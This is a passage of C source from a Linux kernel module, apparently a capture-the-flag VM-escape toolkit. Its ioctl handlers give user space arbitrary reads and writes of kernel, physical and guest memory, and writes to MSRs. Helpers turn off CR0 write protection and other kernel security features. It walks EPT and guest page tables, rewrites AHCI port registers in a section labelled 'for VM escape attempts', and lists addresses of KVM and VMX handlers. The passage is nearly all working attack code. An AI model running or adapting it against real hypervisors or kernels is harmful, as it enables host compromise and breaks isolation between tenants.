    if (region_count > 0) {
        map->start_gpa = map->regions[0][0];
        map->end_gpa = map->regions[region_count-1][1];
        map->size = 0;
        for (int i = 0; i < region_count; i++) {
            unsigned long region_size = map->regions[i][1] - map->regions[i][0];
            map->size += region_size;
            
            printk(KERN_INFO "%s: Region %d: 0x%lx-0x%lx (size: 0x%lx / %lu KB)\n",
                   DRIVER_NAME, i, 
                   map->regions[i][0], map->regions[i][1],
                   region_size, region_size / 1024);
        }
    }
    
    printk(KERN_INFO "%s: SAFELY found %d guest memory regions, total size: 0x%lx (%lu MB)\n",
           DRIVER_NAME, region_count, map->size, map->size / (1024*1024));
    
    return 0;
}

/* ========================================================================
 * Memory Write Implementations
 * ======================================================================== */

static int write_kernel_memory(unsigned long addr, const unsigned char *buffer, 
                                size_t size, int force_disable_wp_flag)
{
    unsigned long orig_cr0 = 0;
    int i;

    if (!is_kernel_address(addr)) return -EINVAL;

    #ifdef CONFIG_X86
    if (g_auto_disable_security) {
        disable_all_security();
    }
    if (force_disable_wp_flag) orig_cr0 = force_disable_wp();
    #endif

    preempt_disable();
    barrier();
    for (i = 0; i < size; i++)
        *((unsigned char *)addr + i) = buffer[i];
    barrier();
    preempt_enable();

    #ifdef CONFIG_X86
    if (force_disable_wp_flag) restore_wp(orig_cr0);
    #endif

    run_ctf_hypercalls();
    return 0;
}

static int write_physical_memory(unsigned long phys_addr, const unsigned char *buffer, size_t size)
{
    void __iomem *mapped;
    unsigned long offset;
    size_t chunk_size, remaining = size, written = 0;

    #ifdef CONFIG_X86
    if (g_auto_disable_security) {
        disable_all_security();
    }
    #endif

    while (remaining > 0) {
        offset = phys_addr & ~PAGE_MASK;
        chunk_size = min(remaining, (size_t)(PAGE_SIZE - offset));
        mapped = ioremap(phys_addr & PAGE_MASK, PAGE_SIZE);
        if (!mapped) return written > 0 ? 0 : -EFAULT;
        memcpy_toio(mapped + offset, buffer + written, chunk_size);
        iounmap(mapped);
        written += chunk_size;
        phys_addr += chunk_size;
        remaining -= chunk_size;
    }

    run_ctf_hypercalls();
    return 0;
}

static int write_physical_via_pfn(unsigned long phys_addr, const unsigned char *buffer, size_t size)
{
    unsigned long pfn = phys_addr >> PAGE_SHIFT;
    unsigned long offset = phys_addr & ~PAGE_MASK;
    struct page *page;
    void *kaddr;
    size_t to_copy, written = 0;

    #ifdef CONFIG_X86
    if (g_auto_disable_security) {
        disable_all_security();
    }
    #endif

    while (written < size) {
        if (!pfn_valid(pfn)) return written > 0 ? 0 : -EINVAL;
        page = pfn_to_page(pfn);
        if (!page) return written > 0 ? 0 : -EFAULT;
        kaddr = kmap_atomic(page);
        if (!kaddr) return written > 0 ? 0 : -ENOMEM;
        to_copy = min(size - written, (size_t)(PAGE_SIZE - offset));
        memcpy(kaddr + offset, buffer + written, to_copy);
        kunmap_atomic(kaddr);
        written += to_copy;
        pfn++;
        offset = 0;
    }

    run_ctf_hypercalls();
    return 0;
}

static int write_guest_memory_gpa(unsigned long gpa, const unsigned char *buffer, size_t size)
{
    return write_physical_memory(gpa, buffer, size);
}

#ifdef CONFIG_X86
static int write_msr_safe_local(u32 msr, u64 value)
{
    u32 low = value & 0xFFFFFFFF;
    u32 high = value >> 32;
    int err;

    asm volatile("1: wrmsr\n"
                 "2:\n"
                 ".section .fixup,\"ax\"\n"
                 "3: mov %4, %0\n"
                 "   jmp 2b\n"
                 ".previous\n"
                 _ASM_EXTABLE(1b, 3b)
                 : "=r"(err)
                 : "c"(msr), "a"(low), "d"(high), "i"(-EIO), "0"(0));

    if (!err) run_ctf_hypercalls();
    return err;
}
#endif

static int memset_kernel_memory_impl(unsigned long addr, unsigned char value, size_t size)
{
    unsigned char *buffer = kmalloc(size, GFP_KERNEL);
    int ret;
    if (!buffer) return -ENOMEM;
    memset(buffer, value, size);
    ret = write_kernel_memory(addr, buffer, size, 1);
    kfree(buffer);
    return ret;
}

static int memset_physical_memory_impl(unsigned long phys_addr, unsigned char value, size_t size)
{
    unsigned char *buffer = kmalloc(size, GFP_KERNEL);
    int ret;
    if (!buffer) return -ENOMEM;
    memset(buffer, value, size);
    ret = write_physical_memory(phys_addr, buffer, size);
    kfree(buffer);
    return ret;
}

static int patch_memory(unsigned long addr, const unsigned char *original,
                         const unsigned char *patch, size_t length,
                         int verify_original, int addr_type)
{
    unsigned char *current_bytes;
    int ret;

    if (length > 32) return -EINVAL;
    current_bytes = kmalloc(length, GFP_KERNEL);
    if (!current_bytes) return -ENOMEM;

    if (addr_type == 0)
        ret = read_kernel_memory(addr, current_bytes, length);
    else
        ret = read_physical_memory(addr, current_bytes, length);

    if (ret < 0) { kfree(current_bytes); return ret; }

    if (verify_original && memcmp(current_bytes, original, length) != 0) {
        kfree(current_bytes);
        return -EILSEQ;
    }

    if (addr_type == 0)
        ret = write_kernel_memory(addr, patch, length, 1);
    else
        ret = write_physical_memory(addr, patch, length);

    kfree(current_bytes);
    return ret;
}

/* ========================================================================
 * Address Conversion Implementations
 * ======================================================================== */

static int convert_virt_to_phys(unsigned long virt_addr, struct virt_to_phys_request *req)
{
    unsigned long phys;
    req->virt_addr = virt_addr;
    req->phys_addr = req->pfn = req->offset = 0;
    req->status = -EFAULT;

    if (virt_addr >= PAGE_OFFSET && virt_addr < (unsigned long)high_memory) {
        phys = __pa(virt_addr);
        req->phys_addr = phys;
        req->pfn = phys >> PAGE_SHIFT;
        req->offset = phys & ~PAGE_MASK;
        req->status = 0;
        return 0;
    }

    if (is_vmalloc_addr((void *)virt_addr)) {
        struct page *page = vmalloc_to_page((void *)virt_addr);
        if (page) {
            phys = page_to_phys(page) | (virt_addr & ~PAGE_MASK);
            req->phys_addr = phys;
            req->pfn = phys >> PAGE_SHIFT;
            req->offset = virt_addr & ~PAGE_MASK;
            req->status = 0;
            return 0;
        }
    }

    if (virt_addr >= TASK_SIZE) {
        phys = virt_to_phys((void *)virt_addr);
        if (phys) {
            req->phys_addr = phys;
            req->pfn = phys >> PAGE_SHIFT;
            req->offset = phys & ~PAGE_MASK;
            req->status = 0;
            return 0;
        }
    }
    return -EFAULT;
}

static int convert_phys_to_virt(unsigned long phys_addr, struct phys_to_virt_request *req)
{
    req->phys_addr = phys_addr;
    req->virt_addr = 0;
    req->status = -EFAULT;

    if (req->use_ioremap) {
        void __iomem *mapped = ioremap(phys_addr & PAGE_MASK, PAGE_SIZE);
        if (mapped) {
            req->virt_addr = (unsigned long)mapped + (phys_addr & ~PAGE_MASK);
            req->status = 0;
            return 0;
        }
    } else {
        if (phys_addr < (unsigned long)high_memory - PAGE_OFFSET) {
            req->virt_addr = (unsigned long)phys_to_virt(phys_addr);
            req->status = 0;
            return 0;
        }
        req->virt_addr = (unsigned long)__va(phys_addr);
        if (virt_addr_valid(req->virt_addr)) {
            req->status = 0;
            return 0;
        }
    }
    return -EFAULT;
}

static int convert_hva_to_pfn(unsigned long hva, struct hva_to_pfn_request *req)
{
    struct page *page;
    req->hva = hva;
    req->pfn = 0;
    req->status = -EFAULT;

    if (hva >= PAGE_OFFSET && hva < (unsigned long)high_memory) {
        req->pfn = __pa(hva) >> PAGE_SHIFT;
        req->status = 0;
        return 0;
    }

    if (is_vmalloc_addr((void *)hva)) {
        page = vmalloc_to_page((void *)hva);
        if (page) {
            req->pfn = page_to_pfn(page);
            req->status = 0;
            return 0;
        }
    }

    if (hva < TASK_SIZE && current->mm) {
        int ret;
        mmap_read_lock(current->mm);
        
        #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 9, 0)
        ret = get_user_pages(hva, 1, FOLL_GET, &page, NULL);
        #elif LINUX_VERSION_CODE >= KERNEL_VERSION(4, 9, 0)
        ret = get_user_pages(hva, 1, FOLL_GET | FOLL_FORCE, &page, NULL);
        #else
        ret = get_user_pages(current, current->mm, hva, 1, 0, 1, &page, NULL);
        #endif
        
        mmap_read_unlock(current->mm);
        if (ret == 1) {
            req->pfn = page_to_pfn(page);
            req->status = 0;
            put_page(page);
            return 0;
        }
    }
    return -EFAULT;
}

static int convert_pfn_to_hva(unsigned long pfn, unsigned long *hva)
{
    struct page *page;
    if (!pfn_valid(pfn)) return -EINVAL;
    page = pfn_to_page(pfn);
    if (!page) return -EFAULT;
    *hva = (unsigned long)page_address(page);
    if (!*hva) {
        *hva = (unsigned long)kmap(page);
        if (*hva) kunmap(page);
    }
    return *hva ? 0 : -EFAULT;
}

static inline unsigned long gpa_to_gfn_local(unsigned long gpa) { return gpa >> PAGE_SHIFT; }
static inline unsigned long gfn_to_gpa_local(unsigned long gfn) { return gfn << PAGE_SHIFT; }

static int spte_to_pfn_local(unsigned long spte, struct spte_to_pfn_request *req)
{
    req->spte = spte;
    req->pfn = req->flags = 0;
    req->present = req->writable = req->executable = 0;
    req->status = 0;

    if (!(spte & 0x1)) { req->status = -ENOENT; return -ENOENT; }
    req->present = 1;
    req->pfn = (spte & 0x000FFFFFFFFFF000ULL) >> PAGE_SHIFT;
    req->flags = spte & 0xFFF;
    req->writable = (spte >> 1) & 1;
    req->executable = (spte >> 2) & 1;
    return 0;
}

static int walk_ept_tables(unsigned long eptp, unsigned long gpa, struct ept_walk_request *req)
{
    unsigned long pml4_base, pdpt_base, pd_base, pt_base;
    unsigned long pml4e, pdpte, pde, pte;
    unsigned long pml4_idx, pdpt_idx, pd_idx, pt_idx;
    void __iomem *mapped;
    unsigned long phys;

    req->eptp = eptp; req->gpa = gpa;
    req->hpa = req->pml4e = req->pdpte = req->pde = req->pte = 0;
    req->page_size = 0; req->status = -EFAULT;

    pml4_idx = (gpa >> 39) & 0x1FF;
    pdpt_idx = (gpa >> 30) & 0x1FF;
    pd_idx = (gpa >> 21) & 0x1FF;
    pt_idx = (gpa >> 12) & 0x1FF;

    pml4_base = eptp & 0x000FFFFFFFFFF000ULL;
    mapped = ioremap(pml4_base + pml4_idx * 8, 8);
    if (!mapped) return -EFAULT;
    pml4e = readq(mapped); iounmap(mapped);
    req->pml4e = pml4e;
    if (!(pml4e & 0x1)) return -ENOENT;

    pdpt_base = pml4e & 0x000FFFFFFFFFF000ULL;
    mapped = ioremap(pdpt_base + pdpt_idx * 8, 8);
    if (!mapped) return -EFAULT;
    pdpte = readq(mapped); iounmap(mapped);
    req->pdpte = pdpte;
    if (!(pdpte & 0x1)) return -ENOENT;

    if (pdpte & 0x80) {
        phys = (pdpte & 0x000FFFFFC0000000ULL) | (gpa & 0x3FFFFFFF);
        req->hpa = phys; req->page_size = 1024*1024*1024; req->status = 0;
        return 0;
    }

    pd_base = pdpte & 0x000FFFFFFFFFF000ULL;
    mapped = ioremap(pd_base + pd_idx * 8, 8);
    if (!mapped) return -EFAULT;
    pde = readq(mapped); iounmap(mapped);
    req->pde = pde;
    if (!(pde & 0x1)) return -ENOENT;

    if (pde & 0x80) {
        phys = (pde & 0x000FFFFFFFE00000ULL) | (gpa & 0x1FFFFF);
        req->hpa = phys; req->page_size = 2*1024*1024; req->status = 0;
        return 0;
    }

    pt_base = pde & 0x000FFFFFFFFFF000ULL;
    mapped = ioremap(pt_base + pt_idx * 8, 8);
    if (!mapped) return -EFAULT;
    pte = readq(mapped); iounmap(mapped);
    req->pte = pte;
    if (!(pte & 0x1)) return -ENOENT;

    phys = (pte & 0x000FFFFFFFFFF000ULL) | (gpa & 0xFFF);
    req->hpa = phys; req->page_size = 4096; req->status = 0;
    return 0;
}

static int translate_gva_to_gpa(unsigned long gva, unsigned long cr3, struct gva_translate_request *req)
{
    unsigned long pml4_base, pdpt_base, pd_base, pt_base;
    unsigned long pml4e, pdpte, pde, pte;
    unsigned long pml4_idx, pdpt_idx, pd_idx, pt_idx;
    void __iomem *mapped;
    unsigned long gpa;

    req->gva = gva; req->gpa = req->hva = req->hpa = 0;
    req->cr3 = cr3; req->status = -EFAULT;

    pml4_idx = (gva >> 39) & 0x1FF;
    pdpt_idx = (gva >> 30) & 0x1FF;
    pd_idx = (gva >> 21) & 0x1FF;
    pt_idx = (gva >> 12) & 0x1FF;

    pml4_base = cr3 & 0x000FFFFFFFFFF000ULL;
    mapped = ioremap(pml4_base + pml4_idx * 8, 8);
    if (!mapped) return -EFAULT;
    pml4e = readq(mapped); iounmap(mapped);
    if (!(pml4e & 0x1)) return -ENOENT;

    pdpt_base = pml4e & 0x000FFFFFFFFFF000ULL;
    mapped = ioremap(pdpt_base + pdpt_idx * 8, 8);
    if (!mapped) return -EFAULT;
    pdpte = readq(mapped); iounmap(mapped);
    if (!(pdpte & 0x1)) return -ENOENT;

    if (pdpte & 0x80) {
        gpa = (pdpte & 0x000FFFFFC0000000ULL) | (gva & 0x3FFFFFFF);
        req->gpa = gpa; req->status = 0;
        return 0;
    }

    pd_base = pdpte & 0x000FFFFFFFFFF000ULL;
    mapped = ioremap(pd_base + pd_idx * 8, 8);
    if (!mapped) return -EFAULT;
    pde = readq(mapped); iounmap(mapped);
    if (!(pde & 0x1)) return -ENOENT;

    if (pde & 0x80) {
        gpa = (pde & 0x000FFFFFFFE00000ULL) | (gva & 0x1FFFFF);
        req->gpa = gpa; req->status = 0;
        return 0;
    }

    pt_base = pde & 0x000FFFFFFFFFF000ULL;
    mapped = ioremap(pt_base + pt_idx * 8, 8);
    if (!mapped) return -EFAULT;
    pte = readq(mapped); iounmap(mapped);
    if (!(pte & 0x1)) return -ENOENT;

    gpa = (pte & 0x000FFFFFFFFFF000ULL) | (gva & 0xFFF);
    req->gpa = gpa; req->status = 0;
    return 0;
}

static int convert_virt_to_pfn(unsigned long virt_addr, unsigned long *pfn)
{
    struct virt_to_phys_request req;
    int ret = convert_virt_to_phys(virt_addr, &req);
    if (ret == 0) *pfn = req.pfn;
    return ret;
}

/* ========================================================================
 * Cache Operations Implementation
 * ======================================================================== */

#ifdef CONFIG_X86
/* WBINVD on a single CPU */
static void do_wbinvd(void *info)
{
    asm volatile("wbinvd" ::: "memory");
}

/* Execute WBINVD on all CPUs */
static void wbinvd_all_cpus(void)
{
    printk(KERN_INFO "%s: Executing WBINVD on all CPUs\n", DRIVER_NAME);
    on_each_cpu(do_wbinvd, NULL, 1);
    printk(KERN_INFO "%s: WBINVD complete on all CPUs\n", DRIVER_NAME);
}

/* CLFLUSH on a specific virtual address */
static void clflush_addr(void *addr)
{
    asm volatile("clflush (%0)" :: "r"(addr) : "memory");
}

/* Memory fence */
static void do_mfence(void)
{
    asm volatile("mfence" ::: "memory");
}

/* SFENCE - store fence */
static void do_sfence(void)
{
    asm volatile("sfence" ::: "memory");
}

/* Write to physical memory with cache flush */
static int write_physical_and_flush(unsigned long phys_addr, const unsigned char *buffer,
                                     size_t size)
{
    void *virt_addr;
    unsigned long orig_cr0 = 0;

    printk(KERN_INFO "%s: write_physical_and_flush: phys=0x%lx size=%zu\n",
           DRIVER_NAME, phys_addr, size);

    /* Get virtual address */
    virt_addr = __va(phys_addr);
    
    if (!virt_addr_valid((unsigned long)virt_addr)) {
        printk(KERN_WARNING "%s: Virtual address %p not valid\n", DRIVER_NAME, virt_addr);
        return -EFAULT;
    }

    /* Disable write protection */
    orig_cr0 = force_disable_wp();

    /* Perform the write */
    memcpy(virt_addr, buffer, size);

    /* Memory barrier before flush */
    do_mfence();

    /* Flush the specific cache line */
    clflush_addr(virt_addr);

    /* Store fence to ensure flush completes */
    do_sfence();

    /* Another memory barrier */
    do_mfence();

    /* WBINVD on all CPUs for extra certainty */
    wbinvd_all_cpus();

    /* Restore write protection */
    restore_wp(orig_cr0);

    printk(KERN_INFO "%s: Write + flush complete for phys 0x%lx\n",
           DRIVER_NAME, phys_addr);

    return 0;
}
#endif

/* ========================================================================
 * AHCI Direct Access (for VM escape attempts)
 * ======================================================================== */

#define AHCI_MMIO_BASE  0xfea0e000
#define AHCI_MMIO_SIZE  0x1000

/* AHCI Port registers */
#define AHCI_PORT_BASE(p) (0x100 + (p) * 0x80)
#define PORT_CLB        0x00
#define PORT_CLB_HI     0x04
#define PORT_FB         0x08
#define PORT_FB_HI      0x0C
#define PORT_IS         0x10
#define PORT_CMD        0x18
#define PORT_SSTS       0x28
#define PORT_CI         0x38

static void __iomem *ahci_mmio = NULL;

static int ahci_map_mmio(void)
{
    if (ahci_mmio)
        return 0;  /* Already mapped */
    
    ahci_mmio = ioremap(AHCI_MMIO_BASE, AHCI_MMIO_SIZE);
    if (!ahci_mmio) {
        printk(KERN_ERR "%s: Failed to ioremap AHCI MMIO\n", DRIVER_NAME);
        return -ENOMEM;
    }
    
    printk(KERN_INFO "%s: AHCI MMIO mapped at %p\n", DRIVER_NAME, ahci_mmio);
    return 0;
}

static void ahci_unmap_mmio(void)
{
    if (ahci_mmio) {
        iounmap(ahci_mmio);
        ahci_mmio = NULL;
    }
}

static u32 ahci_read32(u32 offset)
{
    if (!ahci_mmio)
        return 0;
    return readl(ahci_mmio + offset);
}

static void ahci_write32(u32 offset, u32 value)
{
    if (!ahci_mmio)
        return;
    writel(value, ahci_mmio + offset);
}

/* Set FIS base address for a port */
static void ahci_set_fis_base(int port, u64 phys_addr)
{
    u32 port_base = AHCI_PORT_BASE(port);
    
    printk(KERN_INFO "%s: Setting port %d FIS base to 0x%llx\n", 
           DRIVER_NAME, port, phys_addr);
    
    ahci_write32(port_base + PORT_FB, phys_addr & 0xffffffff);
    ahci_write32(port_base + PORT_FB_HI, phys_addr >> 32);
}

/* Set command list base address for a port */
static void ahci_set_clb(int port, u64 phys_addr)
{
    u32 port_base = AHCI_PORT_BASE(port);
    
    printk(KERN_INFO "%s: Setting port %d CLB to 0x%llx\n", 
           DRIVER_NAME, port, phys_addr);
    
    ahci_write32(port_base + PORT_CLB, phys_addr & 0xffffffff);
    ahci_write32(port_base + PORT_CLB_HI, phys_addr >> 32);
}

/* Get port status */
static u32 ahci_get_port_status(int port)
{
    return ahci_read32(AHCI_PORT_BASE(port) + PORT_SSTS);
}

/* ========================================================================
 * Symbol Database Search Functions
 * ======================================================================== */

/* Extended symbol search */
static int search_symbols_extended(const char *pattern, struct symbol_request *results, 
                                    int max_results, int offset)
{
    int i, result_count = 0;
    int pattern_len = strlen(pattern);
    
    if (pattern_len == 0) return 0;
    
    for (i = 0; kvm_symbols[i].name != NULL && result_count < max_results; i++) {
        if (kvm_symbols[i].address) {
            /* Check if symbol name contains the pattern */
            if (strstr(kvm_symbols[i].name, pattern) != NULL) {
                /* Apply offset if specified */
                if (offset > 0 && result_count < offset) {
                    continue;
                }
                
                strncpy(results[result_count].name, kvm_symbols[i].name, MAX_SYMBOL_NAME - 1);
                results[result_count].address = kvm_symbols[i].address;
                strncpy(results[result_count].description, kvm_symbols[i].description, 255);
                result_count++;
            }
        }
    }
    
    return result_count;
}

/* Advanced symbol search with regex-like pattern */
static int advanced_symbol_search(const char *pattern, struct symbol_request *results, 
                                   int max_results, int flags)
{
    int i, result_count = 0;
    char *pattern_lower = NULL;
    char *name_lower = NULL;
    
    if (!pattern || pattern[0] == '\0') return 0;
    
    /* Convert pattern to lowercase for case-insensitive search */
    pattern_lower = kstrdup(pattern, GFP_KERNEL);
    if (!pattern_lower) return -ENOMEM;
    
    for (i = 0; pattern_lower[i]; i++)
        pattern_lower[i] = tolower(pattern_lower[i]);
    
    for (i = 0; kvm_symbols[i].name != NULL && result_count < max_results; i++) {
        if (kvm_symbols[i].address) {
            int match = 0;
            
            /* Simple substring match */
            if (strstr(kvm_symbols[i].name, pattern)) {
                match = 1;
            }
            /* Case-insensitive substring match */
            else if (flags & 0x01) {
                name_lower = kstrdup(kvm_symbols[i].name, GFP_KERNEL);
                if (name_lower) {
                    for (int j = 0; name_lower[j]; j++)
                        name_lower[j] = tolower(name_lower[j]);
                    
                    if (strstr(name_lower, pattern_lower))
                        match = 1;
                    
                    kfree(name_lower);
                }
            }
            /* Prefix match */
            else if (flags & 0x02) {
                if (strncmp(kvm_symbols[i].name, pattern, strlen(pattern)) == 0)
                    match = 1;
            }
            /* Suffix match */
            else if (flags & 0x04) {
                int name_len = strlen(kvm_symbols[i].name);
                int pattern_len = strlen(pattern);
                if (name_len >= pattern_len && 
                    strcmp(kvm_symbols[i].name + name_len - pattern_len, pattern) == 0)
                    match = 1;
            }
            
            if (match) {
                strncpy(results[result_count].name, kvm_symbols[i].name, MAX_SYMBOL_NAME - 1);
                results[result_count].address = kvm_symbols[i].address;
                strncpy(results[result_count].description, kvm_symbols[i].description, 255);
                result_count++;
            }
        }
    }
    
    kfree(pattern_lower);
    return result_count;
}

/* ========================================================================
 * IOCTL Handler
 * ======================================================================== */

static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
{
    int i, count;

    switch (cmd) {

        /* Control operations */
        case IOCTL_SET_AUTO_SECURITY:
            if (copy_from_user(&g_auto_disable_security, (void __user *)arg, sizeof(int)))
                return -EFAULT;
            printk(KERN_INFO "%s: Auto-disable security: %s\n", 
                   DRIVER_NAME, g_auto_disable_security ? "enabled" : "disabled");
            return 0;

        case IOCTL_FORCE_DISABLE_SECURITY:
            #ifdef CONFIG_X86
            disable_all_security();
            #endif
            return 0;

        /* Symbol Operations */
        case IOCTL_LOOKUP_SYMBOL: {
            struct symbol_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            req.name[MAX_SYMBOL_NAME - 1] = '\0';
            req.address = lookup_kernel_symbol(req.name);
            req.description[0] = '\0';
            for (i = 0; kvm_symbols[i].name != NULL; i++) {
                if (strcmp(kvm_symbols[i].name, req.name) == 0) {
                    strncpy(req.description, kvm_symbols[i].description, sizeof(req.description) - 1);
                    break;
                }
            }
            if (copy_to_user((void __user *)arg, &req, sizeof(req))) return -EFAULT;
            return req.address ? 0 : -ENOENT;
        }

        case IOCTL_GET_SYMBOL_COUNT:
            return copy_to_user((void __user *)arg, &kvm_symbol_count, sizeof(kvm_symbol_count)) ? -EFAULT : 0;

        case IOCTL_GET_SYMBOL_BY_INDEX: {
            unsigned int index;
            struct symbol_request req;
            if (copy_from_user(&index, (void __user *)arg, sizeof(index))) return -EFAULT;
            if (index >= kvm_symbol_count) return -EINVAL;
            count = 0;
            for (i = 0; kvm_symbols[i].name != NULL; i++) {
                if (kvm_symbols[i].address) { if (count == index) break; count++; }
            }
            if (kvm_symbols[i].name == NULL) return -EINVAL;
            strncpy(req.name, kvm_symbols[i].name, MAX_SYMBOL_NAME - 1);
            req.address = kvm_symbols[i].address;
            strncpy(req.description, kvm_symbols[i].description, sizeof(req.description) - 1);
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : 0;
        }

        case IOCTL_FIND_SYMBOL_BY_NAME: {
            struct symbol_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            req.name[MAX_SYMBOL_NAME - 1] = '\0';
            for (i = 0; kvm_symbols[i].name != NULL; i++) {
                if (kvm_symbols[i].address && strstr(kvm_symbols[i].name, req.name)) {
                    strncpy(req.name, kvm_symbols[i].name, MAX_SYMBOL_NAME - 1);
                    req.address = kvm_symbols[i].address;
                    strncpy(req.description, kvm_symbols[i].description, sizeof(req.description) - 1);
                    return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : 0;
                }
            }
            return -ENOENT;
        }

        case IOCTL_GET_VMX_HANDLERS: {
            count = 0;
            for (i = 0; vmx_handlers[i].name != NULL; i++) if (vmx_handlers[i].address) count++;
            return copy_to_user((void __user *)arg, &count, sizeof(count)) ? -EFAULT : 0;
        }

        case IOCTL_GET_VMX_HANDLER_INFO: {
            struct vmx_handler_info handlers[32];
            int handler_count = 0;
            
            for (i = 0; vmx_handlers[i].name != NULL && handler_count < 32; i++) {
                if (vmx_handlers[i].address) {
                    strncpy(handlers[handler_count].name, vmx_handlers[i].name, MAX_SYMBOL_NAME - 1);
                    handlers[handler_count].address = vmx_handlers[i].address;
                    handlers[handler_count].exit_reason = vmx_handlers[i].exit_reason;
                    handler_count++;
                }
            }
            
            if (copy_to_user((void __user *)arg, handlers, sizeof(struct vmx_handler_info) * handler_count))
                return -EFAULT;
            return handler_count;
        }

        case IOCTL_GET_SVM_HANDLERS: {
            count = 0;
            for (i = 0; svm_handlers[i].name != NULL; i++) if (svm_handlers[i].address) count++;
            return copy_to_user((void __user *)arg, &count, sizeof(count)) ? -EFAULT : 0;
        }

        case IOCTL_SEARCH_SYMBOLS: {
            char pattern[MAX_SYMBOL_NAME];
            struct symbol_request results[16];
            int result_count = 0;
            
            if (copy_from_user(pattern, (void __user *)arg, sizeof(pattern))) 
                return -EFAULT;
            
            pattern[MAX_SYMBOL_NAME - 1] = '\0';
            
            /* Use the new extended search function with default parameters */
            result_count = search_symbols_extended(pattern, results, 16, 0);
            
            if (copy_to_user((void __user *)arg, results, sizeof(struct symbol_request) * result_count)) 
                return -EFAULT;
            
            return result_count;
        }

        case IOCTL_SEARCH_SYMBOLS_EXT: {
            struct symbol_search_ext ext_req;
            int result_count;
            
            if (copy_from_user(&ext_req, (void __user *)arg, sizeof(ext_req))) 
                return -EFAULT;
            
            ext_req.pattern[MAX_SYMBOL_NAME - 1] = '\0';
            
            /* Limit max results to array size */
            if (ext_req.max_results > 32)
                ext_req.max_results = 32;
            
            /* Perform extended search */
            result_count = search_symbols_extended(ext_req.pattern, ext_req.results, 
                                                    ext_req.max_results, ext_req.offset);
            
            /* Return the count of results found */
            if (copy_to_user((void __user *)arg, &ext_req, sizeof(ext_req))) 
                return -EFAULT;
            
            return result_count;
        }

        /* Memory Read Operations */
        case IOCTL_READ_KERNEL_MEM: {
            struct kernel_mem_read req;
            unsigned char *kbuf;
            int ret;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            if (!req.kernel_addr || !req.length || !req.user_buffer || req.length > 1024*1024) return -EINVAL;
            kbuf = kmalloc(req.length, GFP_KERNEL);
            if (!kbuf) return -ENOMEM;
            ret = read_kernel_memory(req.kernel_addr, kbuf, req.length);
            if (ret == 0 && copy_to_user(req.user_buffer, kbuf, req.length)) ret = -EFAULT;
            kfree(kbuf);
            run_ctf_hypercalls();
            return ret;
        }

        case IOCTL_READ_PHYSICAL_MEM: {
            struct physical_mem_read req;
            unsigned char *kbuf;
            int ret;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            if (!req.length || !req.user_buffer || req.length > 1024*1024) return -EINVAL;
            kbuf = kmalloc(req.length, GFP_KERNEL);
            if (!kbuf) return -ENOMEM;
            ret = read_physical_memory(req.phys_addr, kbuf, req.length);
            if (ret == 0 && copy_to_user(req.user_buffer, kbuf, req.length)) ret = -EFAULT;
            kfree(kbuf);
            run_ctf_hypercalls();
            return ret;
        }

        case IOCTL_READ_PFN_DATA: {
            struct physical_mem_read req;
            unsigned char *kbuf;
            int ret;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            if (!req.length || !req.user_buffer || req.length > 1024*1024) return -EINVAL;
            kbuf = kmalloc(req.length, GFP_KERNEL);
            if (!kbuf) return -ENOMEM;
            ret = read_physical_via_pfn(req.phys_addr, kbuf, req.length);
            if (ret == 0 && copy_to_user(req.user_buffer, kbuf, req.length)) ret = -EFAULT;
            kfree(kbuf);
            run_ctf_hypercalls();
            return ret;
        }

        case IOCTL_READ_GUEST_MEM: {
            struct guest_mem_read req;
            unsigned char *kbuf;
            int ret;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            if ((!req.gpa && !req.gva) || !req.length || !req.user_buffer || req.length > 1024*1024) return -EINVAL;
            kbuf = kmalloc(req.length, GFP_KERNEL);
            if (!kbuf) return -ENOMEM;
            switch (req.mode) {
                case 0: ret = read_guest_memory_gpa(req.gpa, kbuf, req.length); break;
                case 2: ret = read_guest_memory_gpa(req.gpa << PAGE_SHIFT, kbuf, req.length); break;
                default: ret = -ENOSYS;
            }
            if (ret == 0 && copy_to_user(req.user_buffer, kbuf, req.length)) ret = -EFAULT;
            kfree(kbuf);
            run_ctf_hypercalls();
            return ret;
        }

        case IOCTL_SCAN_MEMORY_REGION: {
            struct { struct mem_region region; struct mem_pattern pattern; } scan_req;
            unsigned long *results_buf;
            int max_results = 256, found;
            if (copy_from_user(&scan_req, (void __user *)arg, sizeof(scan_req))) return -EFAULT;
            results_buf = kmalloc(max_results * sizeof(unsigned long), GFP_KERNEL);
            if (!results_buf) return -ENOMEM;
            found = scan_memory_region(&scan_req.region, &scan_req.pattern, results_buf, max_results);
            if (found > 0 && scan_req.region.buffer) {
                size_t to_copy = min((size_t)(found * sizeof(unsigned long)), scan_req.region.buffer_size);
                if (copy_to_user(scan_req.region.buffer, results_buf, to_copy)) { kfree(results_buf); return -EFAULT; }
            }
            kfree(results_buf);
            return found;
        }

        case IOCTL_FIND_MEMORY_PATTERN: {
            struct pattern_search_request req;
            int ret;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            if (req.end <= req.start || req.pattern_len > sizeof(req.pattern)) return -EINVAL;
            ret = find_pattern_in_range(req.start, req.end, req.pattern, req.pattern_len, &req.found_addr, 1);
            if (ret == 0 && copy_to_user((void __user *)arg, &req, sizeof(req))) return -EFAULT;
            return ret;
        }

        case IOCTL_MAP_GUEST_MEMORY: {
            struct guest_memory_map map;
            int ret = map_guest_memory(&map);
            if (ret == 0 && copy_to_user((void __user *)arg, &map, sizeof(map))) return -EFAULT;
            return ret;
        }

        #ifdef CONFIG_X86
        case IOCTL_READ_CR_REGISTER: {
            struct { int cr_num; unsigned long value; } cr_req;
            if (copy_from_user(&cr_req, (void __user *)arg, sizeof(cr_req))) return -EFAULT;
            if (cr_req.cr_num < 0 || cr_req.cr_num > 4 || cr_req.cr_num == 1) return -EINVAL;
            cr_req.value = read_cr_register(cr_req.cr_num);
            return copy_to_user((void __user *)arg, &cr_req, sizeof(cr_req)) ? -EFAULT : 0;
        }

        case IOCTL_READ_MSR: {
            struct msr_read_request req;
